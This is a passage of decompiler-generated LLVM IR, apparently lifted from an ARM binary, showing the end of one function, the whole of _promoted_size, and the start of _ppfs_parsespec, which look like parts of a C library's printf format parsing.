  %v2_13210 = load i32, i32* %v1_13210, align 4
  store i32 %v2_13210, i32* %r1.global-to-local, align 4
  %v3_13210 = add i32 %v3_1320c, 4
  %v4_13210 = inttoptr i32 %v3_13210 to i32*
  %v5_13210 = load i32, i32* %v4_13210, align 4
  store i32 %v5_13210, i32* %r2.global-to-local, align 4
  %v1_13214 = add i32 %v3_1320c, 8
  store i32 %v1_13214, i32* %r3.global-to-local, align 4
  store i32 %v1_13214, i32* %v2_13184, align 4
  %v0_1321c = load i32, i32* %ip.global-to-local, align 4
  %v1_1321c = inttoptr i32 %v0_1321c to i32*
  %v2_1321c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_1321c, i32* %v1_1321c, align 4
  %v3_1321c = add i32 %v0_1321c, 4
  %v4_1321c = inttoptr i32 %v3_1321c to i32*
  %v5_1321c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1321c, i32* %v4_1321c, align 4
  br label %dec_label_pc_13234

dec_label_pc_13224:                               ; preds = %dec_label_pc_131b8, %dec_label_pc_131a4, %dec_label_pc_13198, %dec_label_pc_131dc
  %v1_13224 = add i32 %v3_13184, 4
  store i32 %v1_13224, i32* %r3.global-to-local, align 4
  store i32 %v1_13224, i32* %v2_13184, align 4
  %v0_1322c = load i32, i32* %r1.global-to-local, align 4
  %v1_1322c = inttoptr i32 %v0_1322c to i32*
  %v2_1322c = load i32, i32* %v1_1322c, align 4
  store i32 %v2_1322c, i32* %r3.global-to-local, align 4
  %v1_13230 = load i32, i32* %ip.global-to-local, align 4
  %v2_13230 = inttoptr i32 %v1_13230 to i32*
  store i32 %v2_1322c, i32* %v2_13230, align 4
  br label %dec_label_pc_13234

dec_label_pc_13234:                               ; preds = %dec_label_pc_1320c, %dec_label_pc_131f8, %dec_label_pc_131e4, %dec_label_pc_13224
  %v0_13234 = load i32, i32* %ip.global-to-local, align 4
  %v1_13234 = add i32 %v0_13234, 8
  store i32 %v1_13234, i32* %ip.global-to-local, align 4
  %v0_13238.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1323c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13238

dec_label_pc_13238:                               ; preds = %dec_label_pc_13174, %dec_label_pc_13234
  %v0_1323c = phi i32 [ %v0_1323c25, %dec_label_pc_13174 ], [ %v0_1323c.pre, %dec_label_pc_13234 ]
  %v0_13238 = phi i32 [ %v1_1317424, %dec_label_pc_13174 ], [ %v0_13238.pre, %dec_label_pc_13234 ]
  %v1_13238 = add i32 %v0_13238, 1
  store i32 %v1_13238, i32* %lr.global-to-local, align 4
  %v1_1323c = add i32 %v0_1323c, 28
  %v2_1323c = inttoptr i32 %v1_1323c to i32*
  %v3_1323c = load i32, i32* %v2_1323c, align 4
  store i32 %v3_1323c, i32* %r3.global-to-local, align 4
  %v5_13244 = icmp slt i32 %v1_13238, %v3_1323c
  br i1 %v5_13244, label %dec_label_pc_13174, label %dec_label_pc_1323c.dec_label_pc_13248.loopexit_crit_edge

dec_label_pc_1324c:                               ; preds = %entry
  br i1 %v6_13128, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1324c
  %v2_13250 = add i32 %v0_13110, 36
  %v3_13250 = inttoptr i32 %v2_13250 to i8*
  %v4_13250 = load i8, i8* %v3_13250, align 1
  %v5_13250 = zext i8 %v4_13250 to i32
  %v5_13254 = mul nuw nsw i32 %v5_13250, 8
  %v6_13254 = add i32 %v5_13254, %v1_1311c
  store i32 %v6_13254, i32* %r3.global-to-local, align 4
  %v2_13258 = add i32 %v6_13254, -8
  %v3_13258 = inttoptr i32 %v2_13258 to i32*
  %v4_13258 = load i32, i32* %v3_13258, align 4
  store i32 %v4_13258, i32* %r3.global-to-local, align 4
  store i32 %v4_13258, i32* %v2_13120, align 4
  %v0_13260.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1324c, %bb
  %v2_13274 = phi i32 [ %v0_13260.pre, %bb ], [ %v0_13110, %dec_label_pc_1324c ]
  %v1_13260 = add i32 %v2_13274, 4
  %v2_13260 = inttoptr i32 %v1_13260 to i32*
  %v3_13260 = load i32, i32* %v2_13260, align 4
  store i32 %v3_13260, i32* %r3.global-to-local, align 4
  %v6_13264 = icmp eq i32 %v3_13260, -2147483648
  br i1 %v6_13264, label %bb15, label %dec_label_pc_13248

bb15:                                             ; preds = %.thread2
  %v2_13268 = add i32 %v2_13274, 37
  %v3_13268 = inttoptr i32 %v2_13268 to i8*
  %v4_13268 = load i8, i8* %v3_13268, align 1
  %v5_13268 = zext i8 %v4_13268 to i32
  %v1_1326c = load i32, i32* %ip.global-to-local, align 4
  %v5_1326c = mul nuw nsw i32 %v5_13268, 8
  %v6_1326c = add i32 %v5_1326c, %v1_1326c
  store i32 %v6_1326c, i32* %r3.global-to-local, align 4
  %v2_13270 = add i32 %v6_1326c, -8
  %v3_13270 = inttoptr i32 %v2_13270 to i32*
  %v4_13270 = load i32, i32* %v3_13270, align 4
  store i32 %v4_13270, i32* %r3.global-to-local, align 4
  store i32 %v4_13270, i32* %v2_13260, align 4
  %v0_13278.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13248

dec_label_pc_1323c.dec_label_pc_13248.loopexit_crit_edge: ; preds = %dec_label_pc_13238
  br label %dec_label_pc_13248.loopexit

dec_label_pc_13248.loopexit:                      ; preds = %dec_label_pc_1323c.dec_label_pc_13248.loopexit_crit_edge, %dec_label_pc_1316c
  %v0_1323c.lcssa = phi i32 [ %v0_1323c, %dec_label_pc_1323c.dec_label_pc_13248.loopexit_crit_edge ], [ %v0_1323c18, %dec_label_pc_1316c ]
  br label %dec_label_pc_13248

dec_label_pc_13248:                               ; preds = %dec_label_pc_13248.loopexit, %.thread2, %bb15
  %v1_13298 = phi i32 [ %v0_1323c.lcssa, %dec_label_pc_13248.loopexit ], [ %v2_13274, %.thread2 ], [ %v0_13278.pre, %bb15 ]
  %v1_13278 = add i32 %v1_13298, 8
  %v2_13278 = inttoptr i32 %v1_13278 to i32*
  %v3_13278 = load i32, i32* %v2_13278, align 4
  store i32 %v3_13278, i32* %r1.global-to-local, align 4
  %v1_1327c = icmp slt i32 %v3_13278, 0
  br i1 %v1_1327c, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_13248
  %v5_13280 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_13280, i32* @r4, align 4
  ret i32 %v1_13298

bb17:                                             ; preds = %dec_label_pc_13248
  %v1_13284 = add i32 %v1_13298, 16
  %v2_13284 = inttoptr i32 %v1_13284 to i32*
  %v3_13284 = load i32, i32* %v2_13284, align 4
  %v1_1328c = sub i32 0, %v3_13278
  store i32 %v1_1328c, i32* %r1.global-to-local, align 4
  %v1_13288 = and i32 %v3_13284, -10
  %v1_13290 = or i32 %v1_13288, 8
  store i32 %v1_13290, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_13298 = add i32 %v1_13298, 20
  %v3_13298 = inttoptr i32 %v2_13298 to i32*
  store i32 32, i32* %v3_13298, align 4
  %v0_1329c = load i32, i32* %r1.global-to-local, align 4
  %v1_1329c = load i32, i32* @r0, align 4
  %v2_1329c = add i32 %v1_1329c, 8
  %v3_1329c = inttoptr i32 %v2_1329c to i32*
  store i32 %v0_1329c, i32* %v3_1329c, align 4
  %v0_132a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_132a0 = load i32, i32* @r0, align 4
  %v2_132a0 = add i32 %v1_132a0, 16
  %v3_132a0 = inttoptr i32 %v2_132a0 to i32*
  store i32 %v0_132a0, i32* %v3_132a0, align 4
  %v2_132a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_132a4, i32* @r4, align 4
  %v8_132a4 = load i32, i32* @r0, align 4
  ret i32 %v8_132a4

; uselistorder directives
  uselistorder i32 %v1_13238, { 2, 1, 0 }
  uselistorder i32 %v0_1323c, { 1, 2, 0 }
  uselistorder i32 %v3_1320c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_13184, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_13184, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_13178, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_1317424, { 1, 0 }
  uselistorder i32 %v0_1323c18, { 2, 0, 1 }
  uselistorder i32 %v0_13110, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_13248, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_13238, { 1, 0 }
  uselistorder label %dec_label_pc_13234, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13224, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1320c, { 1, 0 }
  uselistorder label %dec_label_pc_131f8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_13174, { 1, 0 }
  uselistorder label %dec_label_pc_1316c, { 1, 0 }
  uselistorder label %dec_label_pc_13148, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_132c4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_132b0

dec_label_pc_132b0:                               ; preds = %dec_label_pc_132cc, %entry
  %v0_132b0 = phi i32 [ %v1_132b0, %dec_label_pc_132cc ], [ ptrtoint (i32* @global_var_2334c.1054 to i32), %entry ]
  %v1_132b0 = add i32 %v0_132b0, -2
  %v1_132b4 = add i32 %v0_132b0, -1
  %v2_132b4 = inttoptr i32 %v1_132b4 to i8*
  %v3_132b4 = load i8, i8* %v2_132b4, align 1
  %v4_132b4 = zext i8 %v3_132b4 to i32
  %v1_132b8 = inttoptr i32 %v1_132b0 to i8*
  %v2_132b8 = load i8, i8* %v1_132b8, align 2
  %v3_132b8 = zext i8 %v2_132b8 to i32
  %v3_132bc = mul nuw i32 %v4_132b4, 16777216
  %v4_132c0 = sdiv i32 %v3_132bc, 65536
  %v5_132c0 = or i32 %v4_132c0, %v3_132b8
  %v9_132c4 = icmp eq i32 %v5_132c0, %v1_132c4.pre
  br i1 %v9_132c4, label %dec_label_pc_132b0.dec_label_pc_132d8_crit_edge, label %dec_label_pc_132cc

dec_label_pc_132b0.dec_label_pc_132d8_crit_edge:  ; preds = %dec_label_pc_132b0
  br label %dec_label_pc_132d8

dec_label_pc_132cc:                               ; preds = %dec_label_pc_132b0
  %tmp = icmp ugt i32 %v1_132b0, ptrtoint (i32* @global_var_23334.1056 to i32)
  br i1 %tmp, label %dec_label_pc_132b0, label %dec_label_pc_132d8

dec_label_pc_132d8:                               ; preds = %dec_label_pc_132cc, %dec_label_pc_132b0.dec_label_pc_132d8_crit_edge
  %v2_132e0.pre-phi = sub i32 %v1_132b0, ptrtoint (i32* @global_var_23334.1056 to i32)
  store i32 ptrtoint (i32* @global_var_2334c.1054 to i32), i32* @r2, align 4
  %v4_132e4 = sdiv i32 %v2_132e0.pre-phi, 2
  %v5_132e4 = add i32 %v4_132e4, ptrtoint (i32* @global_var_2334c.1054 to i32)
  %v6_132e4 = inttoptr i32 %v5_132e4 to i8*
  %v7_132e4 = load i8, i8* %v6_132e4, align 1
  %v9_132e4 = zext i8 %v7_132e4 to i32
  ret i32 %v9_132e4

; uselistorder directives
  uselistorder i32 %v1_132b0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_132b0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2334c.1054 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_132f8 = load i32, i32* @r4, align 4
  store i32 %v3_132f8, i32* %stack_var_-32, align 4
  %v6_132f8 = load i32, i32* @r5, align 4
  %v25_132f8 = ptrtoint i32* %stack_var_-32 to i32
  %v1_132fc = add i32 %tmp, 16
  %v2_132fc = inttoptr i32 %v1_132fc to i32*
  %v3_132fc = load i32, i32* %v2_132fc, align 4
  %v2_13300 = ptrtoint i32* %stack_var_-88 to i32
  %v1_13304 = and i32 %v3_132fc, 128
  store i32 %v1_13304, i32* @r4, align 4
  %v2_13304 = icmp eq i32 %v1_13304, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_13324 = add i32 %tmp, 24
  %v2_13324 = inttoptr i32 %v1_13324 to i32*
  %v3_13324 = load i32, i32* %v2_13324, align 4
  store i32 %v3_13324, i32* %sb.global-to-local, align 4
  br i1 %v2_13304, label %bb, label %dec_label_pc_13344

bb:                                               ; preds = %entry
  %v3_13328 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_13390

dec_label_pc_13334:                               ; preds = %dec_label_pc_13514
  %v0_13334 = load i32, i32* %r0.global-to-local, align 4
  %v0_13544.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1333c:                               ; preds = %dec_label_pc_13540
  %v1_1333c = add i32 %v0_13544.pre, 1
  store i32 %v1_1333c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1355c

dec_label_pc_13344:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13348

dec_label_pc_13348:                               ; preds = %dec_label_pc_1337c.dec_label_pc_13348_crit_edge, %dec_label_pc_13344
  %v1_13358 = phi i32 [ %v1_1336c, %dec_label_pc_1337c.dec_label_pc_13348_crit_edge ], [ 0, %dec_label_pc_13344 ]
  %v0_13348 = phi i32 [ %v0_13348.pre, %dec_label_pc_1337c.dec_label_pc_13348_crit_edge ], [ %tmp, %dec_label_pc_13344 ]
  %v1_13348 = inttoptr i32 %v0_13348 to i32*
  %v2_13348 = load i32, i32* %v1_13348, align 4
  %v4_1334c = mul i32 %v1_13358, 4
  %v5_1334c = add i32 %v2_13348, %v4_1334c
  store i32 %v5_1334c, i32* %r3.global-to-local, align 4
  %v1_13350 = add i32 %v5_1334c, -4
  %v2_13350 = inttoptr i32 %v1_13350 to i32*
  %v3_13350 = load i32, i32* %v2_13350, align 4
  store i32 %v3_13350, i32* %r1.global-to-local, align 4
  store i32 %v25_132f8, i32* %ip.global-to-local, align 4
  %v2_13358 = add i32 %v1_13358, %v25_132f8
  store i32 %v2_13358, i32* %r2.global-to-local, align 4
  %v1_1335c = trunc i32 %v3_13350 to i8
  %v3_1335c = add i32 %v2_13358, -56
  %v4_1335c = inttoptr i32 %v3_1335c to i8*
  store i8 %v1_1335c, i8* %v4_1335c, align 1
  %v0_13360 = load i32, i32* %r2.global-to-local, align 4
  %v1_13360 = add i32 %v0_13360, -56
  %v2_13360 = inttoptr i32 %v1_13360 to i8*
  %v3_13360 = load i8, i8* %v2_13360, align 1
  %v4_13360 = zext i8 %v3_13360 to i32
  store i32 %v4_13360, i32* %r2.global-to-local, align 4
  %v0_13364 = load i32, i32* %r3.global-to-local, align 4
  %v1_13364 = add i32 %v0_13364, -4
  %v2_13364 = inttoptr i32 %v1_13364 to i32*
  %v3_13364 = load i32, i32* %v2_13364, align 4
  store i32 %v3_13364, i32* %r3.global-to-local, align 4
  %v9_13368 = icmp eq i32 %v4_13360, %v3_13364
  %v0_1336c = load i32, i32* %r0.global-to-local, align 4
  %v1_1336c = add i32 %v0_1336c, 1
  store i32 %v1_1336c, i32* %r0.global-to-local, align 4
  br i1 %v9_13368, label %dec_label_pc_13374, label %dec_label_pc_1378c

dec_label_pc_13374:                               ; preds = %dec_label_pc_13348
  %v2_13374 = icmp eq i8 %v3_13360, 0
  br i1 %v2_13374, label %dec_label_pc_13384, label %dec_label_pc_1337c

dec_label_pc_1337c:                               ; preds = %dec_label_pc_13374
  %tmp166 = icmp ult i32 %v1_1336c, 32
  br i1 %tmp166, label %dec_label_pc_1337c.dec_label_pc_13348_crit_edge, label %dec_label_pc_13384

dec_label_pc_1337c.dec_label_pc_13348_crit_edge:  ; preds = %dec_label_pc_1337c
  %v0_13348.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13348

dec_label_pc_13384:                               ; preds = %dec_label_pc_1337c, %dec_label_pc_13374
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1338c = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_13390

dec_label_pc_13390:                               ; preds = %bb, %dec_label_pc_13384
  %storemerge102 = phi i32 [ %v2_1338c, %dec_label_pc_13384 ], [ %v3_13328, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_133a0

dec_label_pc_1339c:                               ; preds = %.thread22, %dec_label_pc_134ac
  %v0_1339c = phi i32 [ %v2_13524, %.thread22 ], [ %storemerge105, %dec_label_pc_134ac ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_134ac ]
  store i32 %v0_1339c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_133a0

dec_label_pc_133a0:                               ; preds = %dec_label_pc_13390, %dec_label_pc_1339c
  %v1_133bc = phi i32 [ %storemerge102, %dec_label_pc_13390 ], [ %v0_1339c, %dec_label_pc_1339c ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_13390 ], [ %stack_var_-48.0, %dec_label_pc_1339c ]
  %v1_133a0 = inttoptr i32 %v1_133bc to i8*
  %v2_133a0 = load i8, i8* %v1_133a0, align 1
  %v3_133a0 = zext i8 %v2_133a0 to i32
  store i32 %v3_133a0, i32* %r3.global-to-local, align 4
  %v7_133a4 = icmp eq i8 %v2_133a0, 42
  br i1 %v7_133a4, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_133a0
  store i32 %v1_133bc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_133a0
  %v1_133b0 = load i32, i32* @lr, align 4
  %v4_133b0 = mul i32 %v1_133b0, -4
  %v5_133b0 = add i32 %v4_133b0, %v25_132f8
  store i32 %v5_133b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_133bc = add i32 %v1_133bc, 1
  store i32 %v2_133bc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_133c4 = add i32 %v5_133b0, -12
  %v4_133c4 = inttoptr i32 %v3_133c4 to i32*
  store i32 0, i32* %v4_133c4, align 4
  %v0_133e8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_133e8.pre = phi i32 [ %v0_133e8.pre.pre, %bb124 ], [ %v1_133bc, %.thread9.thread ]
  %v2_133ec.pre = load i32, i32* @global_var_2c58c, align 4
  br label %.backedge

dec_label_pc_133cc:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_133d0 = load i32, i32* %r0.global-to-local, align 4
  %v7_133d4 = icmp sgt i32 %v0_133d0, 4094
  br i1 %v7_133d4, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_133cc
  %v1_133dc14 = add i32 %v0_13460, 1
  store i32 %v1_133dc14, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_133cc
  %v11_133d8 = mul i32 %v0_133d0, 10
  %v12_133d8 = add i32 %v11_133d8, %v3_133e8
  store i32 %v12_133d8, i32* %r3.global-to-local, align 4
  %v1_133dc = add i32 %v0_13460, 1
  store i32 %v1_133dc, i32* %r6.global-to-local, align 4
  %v9_133e0 = add i32 %v12_133d8, -48
  store i32 %v9_133e0, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_13460 = phi i32 [ %v0_133e8.pre, %.preheader ], [ %v1_133dc, %bb126 ], [ %v1_133dc14, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_2c58c to i32), i32* %r3.global-to-local, align 4
  %v1_133e8 = inttoptr i32 %v0_13460 to i8*
  %v2_133e8 = load i8, i8* %v1_133e8, align 1
  %v3_133e8 = zext i8 %v2_133e8 to i32
  store i32 %v3_133e8, i32* %r2.global-to-local, align 4
  store i32 %v2_133ec.pre, i32* %r3.global-to-local, align 4
  %v3_133f0 = mul nuw nsw i32 %v3_133e8, 2
  %v4_133f0 = add i32 %v3_133f0, %v2_133ec.pre
  %v5_133f0 = inttoptr i32 %v4_133f0 to i8*
  %v6_133f0 = load i8, i8* %v5_133f0, align 1
  %v8_133f0 = zext i8 %v6_133f0 to i32
  store i32 %v8_133f0, i32* %r3.global-to-local, align 4
  %v1_133f4 = and i32 %v8_133f0, 8
  %v2_133f4 = icmp eq i32 %v1_133f4, 0
  br i1 %v2_133f4, label %dec_label_pc_133fc, label %dec_label_pc_133cc

dec_label_pc_133fc:                               ; preds = %.backedge
  %v0_133fc = load i32, i32* %r1.global-to-local, align 4
  %v1_133fc = add i32 %v0_133fc, -1
  %v2_133fc = inttoptr i32 %v1_133fc to i8*
  %v3_133fc = load i8, i8* %v2_133fc, align 1
  %v4_133fc = zext i8 %v3_133fc to i32
  store i32 %v4_133fc, i32* %r3.global-to-local, align 4
  %v7_13400 = icmp eq i8 %v3_133fc, 37
  br i1 %v7_13400, label %dec_label_pc_13408, label %dec_label_pc_134c4

dec_label_pc_13408:                               ; preds = %dec_label_pc_133fc
  %v7_13408 = icmp eq i8 %v2_133e8, 36
  %. = zext i1 %v7_13408 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_13414 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_13414, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_13408
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_13408, %bb130
  %v1_13470 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_13408 ]
  %v2_1341c = icmp eq i32 %v1_13470, 0
  %v0_1344c = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_1341c, label %dec_label_pc_1344c, label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %thread-pre-split
  %v2_1344c = icmp eq i32 %v0_1344c, 0
  %v1_13428 = add i32 %v0_13460, 1
  store i32 %v1_13428, i32* %r1.global-to-local, align 4
  br i1 %v2_1344c, label %dec_label_pc_1378c, label %dec_label_pc_13430

dec_label_pc_13430:                               ; preds = %dec_label_pc_13424
  %v2_13430 = sub i32 %v0_13414, %v0_1344c
  %v4_13430 = xor i32 %v0_1344c, %v0_13414
  %v5_13430 = xor i32 %v2_13430, %v0_13414
  %v6_13430 = and i32 %v5_13430, %v4_13430
  %v7_13430 = icmp slt i32 %v6_13430, 0
  %v8_13430 = icmp slt i32 %v2_13430, 0
  %v9_13430 = icmp eq i32 %v0_13414, %v0_1344c
  %v3_13434 = xor i1 %v8_13430, %v7_13430
  %v4_13434 = or i1 %v9_13430, %v3_13434
  br i1 %v4_13434, label %dec_label_pc_13444, label %bb131

bb131:                                            ; preds = %dec_label_pc_13430
  store i32 %v0_13414, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13444

dec_label_pc_13440:                               ; preds = %dec_label_pc_13460, %dec_label_pc_13468
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13444

dec_label_pc_13444:                               ; preds = %bb131, %dec_label_pc_13430, %dec_label_pc_13440
  %v0_13444 = phi i32 [ %v0_133fc, %dec_label_pc_13440 ], [ %v1_13428, %dec_label_pc_13430 ], [ %v1_13428, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_13440 ], [ %v0_13414, %dec_label_pc_13430 ], [ %v0_13414, %bb131 ]
  br label %dec_label_pc_1347c

dec_label_pc_1344c:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_1344c, 1
  br i1 %tmp132, label %dec_label_pc_13460, label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_1344c
  %v7_13454 = icmp eq i8 %v2_133e8, 109
  br i1 %v7_13454, label %dec_label_pc_134c4, label %dec_label_pc_1378c

dec_label_pc_13460:                               ; preds = %dec_label_pc_1344c
  %tmp167 = icmp ugt i32 %v0_13460, %v0_133fc
  br i1 %tmp167, label %dec_label_pc_13468, label %dec_label_pc_13440

dec_label_pc_13468:                               ; preds = %dec_label_pc_13460
  %v1_13468 = inttoptr i32 %v0_133fc to i8*
  %v2_13468 = load i8, i8* %v1_13468, align 1
  %v3_13468 = zext i8 %v2_13468 to i32
  store i32 %v3_13468, i32* %r3.global-to-local, align 4
  %v7_1346c = icmp eq i8 %v2_13468, 48
  br i1 %v7_1346c, label %dec_label_pc_13440, label %bb133

bb133:                                            ; preds = %dec_label_pc_13468
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_1347c.loopexit:                      ; preds = %dec_label_pc_13484
  %v1_13490 = load i32, i32* @r4, align 4
  %v3_13490 = or i32 %v1_13490, %v0_134a4
  store i32 %v3_13490, i32* @r4, align 4
  %v2_13494 = add i32 %storemerge105, 1
  br label %dec_label_pc_1347c

dec_label_pc_1347c:                               ; preds = %dec_label_pc_1347c.loopexit, %dec_label_pc_13444
  %storemerge105 = phi i32 [ %v0_13444, %dec_label_pc_13444 ], [ %v2_13494, %dec_label_pc_1347c.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_2332c.1061 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_13488 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_1349c, %dec_label_pc_1347c
  %v0_134a4 = phi i32 [ %v2_134a4, %dec_label_pc_1349c ], [ 1, %dec_label_pc_1347c ]
  %v0_13484 = phi i32 [ %v5_13484, %dec_label_pc_1349c ], [ ptrtoint ([8 x i8]* @global_var_2332c.1061 to i32), %dec_label_pc_1347c ]
  %v1_13484 = inttoptr i32 %v0_13484 to i8*
  %v2_13484 = load i8, i8* %v1_13484, align 1
  %v3_13484 = zext i8 %v2_13484 to i32
  store i32 %v3_13484, i32* %r2.global-to-local, align 4
  %v5_13484 = add i32 %v0_13484, 1
  store i32 %v5_13484, i32* %r1.global-to-local, align 4
  %v2_13488 = load i8, i8* %v1_13488, align 1
  %v3_13488 = zext i8 %v2_13488 to i32
  store i32 %v3_13488, i32* %r3.global-to-local, align 4
  %v9_1348c = icmp eq i8 %v2_13488, %v2_13484
  br i1 %v9_1348c, label %dec_label_pc_1347c.loopexit, label %dec_label_pc_1349c

dec_label_pc_1349c:                               ; preds = %dec_label_pc_13484
  %v1_1349c = inttoptr i32 %v5_13484 to i8*
  %v2_1349c = load i8, i8* %v1_1349c, align 1
  %v3_1349c = zext i8 %v2_1349c to i32
  store i32 %v3_1349c, i32* %r3.global-to-local, align 4
  %v2_134a0 = icmp eq i8 %v2_1349c, 0
  %v2_134a4 = mul i32 %v0_134a4, 2
  store i32 %v2_134a4, i32* %r0.global-to-local, align 4
  br i1 %v2_134a0, label %dec_label_pc_134ac, label %dec_label_pc_13484

dec_label_pc_134ac:                               ; preds = %dec_label_pc_1349c
  %v1_134ac = add i32 %storemerge105, -1
  %v2_134ac = inttoptr i32 %v1_134ac to i8*
  %v3_134ac = load i8, i8* %v2_134ac, align 1
  %v7_134b0 = icmp eq i8 %v3_134ac, 37
  %v0_134b4 = load i32, i32* @r4, align 4
  %v1_134b4 = and i32 %v0_134b4, 10
  store i32 %v1_134b4, i32* %r3.global-to-local, align 4
  %v4_134b8 = udiv i32 %v1_134b4, 2
  %v5_134b8 = sub nuw nsw i32 -1, %v4_134b8
  %v6_134b8 = and i32 %v0_134b4, %v5_134b8
  store i32 %v6_134b8, i32* @r4, align 4
  br i1 %v7_134b0, label %dec_label_pc_134c0, label %dec_label_pc_1339c

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134ac
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_134c4:                               ; preds = %bb133, %dec_label_pc_133fc, %dec_label_pc_13454, %dec_label_pc_134c0
  %v1_13508 = phi i32 [ %storemerge105, %dec_label_pc_134c0 ], [ %v0_13460, %bb133 ], [ %v0_13460, %dec_label_pc_13454 ], [ %v0_13460, %dec_label_pc_133fc ]
